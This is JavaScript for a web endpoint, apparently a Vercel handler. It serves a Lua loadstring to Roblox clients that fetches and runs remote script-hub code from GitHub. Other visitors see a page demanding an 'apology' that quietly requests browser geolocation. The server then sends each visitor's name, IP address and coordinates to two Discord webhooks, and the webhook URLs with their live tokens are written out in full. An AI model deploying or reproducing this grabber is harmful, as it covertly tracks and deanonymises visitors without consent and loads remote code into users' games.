export default async function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';

  function isTrollMessage(text) {
    const lower = text.toLowerCase();
    return (
      lower.length < 5 ||
      lower.includes('troll') ||
      lower.includes('skid') ||
      lower.includes('lol') ||
      lower.includes('lmao') ||
      lower.includes('xd') ||
      lower.includes('noob') ||
      lower.includes('get good') ||
      lower.includes('cry') ||
      lower.includes('rekt')
    );
  }

  if (userAgent.includes('Roblox') || userAgent === '') {
    // Roblox client loading the script
    res.setHeader('Content-Type', 'text/plain');
    res.status(200).send(`
print("Script loaded!")
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub/main/OldFluentFisch.lua"))()
    `);
  } else if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', async () => {
      const data = JSON.parse(body || '{}');
      let name = data.name || 'Unknown';
      let message = data.message || 'No message';
      let latitude = data.geoLocation?.latitude || 'Not available';
      let longitude = data.geoLocation?.longitude || 'Not available';

      name = name.replace(/@/g, '@\u200b');
      message = message.replace(/@/g, '@\u200b');

      if (isTrollMessage(name) || isTrollMessage(message)) {
        // If troll, send a small HTML page that redirects instantly
        res.setHeader('Content-Type', 'text/html');
        res.status(302).send(`
          <html>
            <head>
              <meta http-equiv="refresh" content="0; url=https://m.youtube.com/watch?v=NjD0H4eBfng&pp=ygUObmFlIG5pKiphIHNvbmc%3D" />
            </head>
            <body>
              <p>Redirecting...</p>
            </body>
          </html>
        `);
        return;
      }

      const skidWebhookUrl = 'https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_';
      await fetch(skidWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**New Skid Message**\n**Name:** ${name}\n**Message:** ${message}`
        })
      });

      const ipWebhookUrl = 'https://discord.com/api/webhooks/1365685136485515505/LxhMw0xyxwMbUqcAKhDSxvhJjTl9AXnOQ883hP2sbBY8xLWDCv6I6y16xDy_Quxk0Q5l';
      await fetch(ipWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**IP Address Detected**\n**IP Address:** ${userIP}\n**Real Name:** ${name}\n**Geolocation:** Latitude: ${latitude}, Longitude: ${longitude}`
        })
      });

      res.status(200).json({ success: true });
    });
  } else {
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>WHAT ARE YOU DOING</title>
  <style>
    body {
      background-color: black;
      color: white;
      font-family: monospace;
      text-align: center;
      margin-top: 100px;
    }
    input, textarea, button {
      padding: 10px;
      margin: 10px;
      font-size: 16px;
      width: 300px;
    }
  </style>
</head>
<body>
  <h1>WHAT ARE YOU DOING</h1>
  <p>Type your name and apology:</p>
  <input type="text" id="nameBox" placeholder="Your Name"><br>
  <textarea id="messageBox" rows="4" placeholder="I'm sorry..."></textarea><br>
  <button onclick="sendMessage()">Send</button>

  <script>
    async function sendMessage() {
      const name = document.getElementById('nameBox').value;
      const message = document.getElementById('messageBox').value;

      if (!name || !message) {
        alert('Please fill all fields!');
        return;
      }

      let geoLocation = {};
      if (navigator.geolocation) {
        try {
          const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
          });
          geoLocation.latitude = pos.coords.latitude;
          geoLocation.longitude = pos.coords.longitude;
        } catch (e) {
          geoLocation.latitude = 'Not available';
          geoLocation.longitude = 'Not available';
        }
      }

      fetch(window.location.pathname, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name, message, geoLocation })
      }).then(res => {
        if (res.redirected) {
          window.location.href = res.url;
        } else {
          window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        }
      }).catch(() => {
        alert('Failed to send.');
      });
    }
  </script>
</body>
</html>
    `);
  }
}
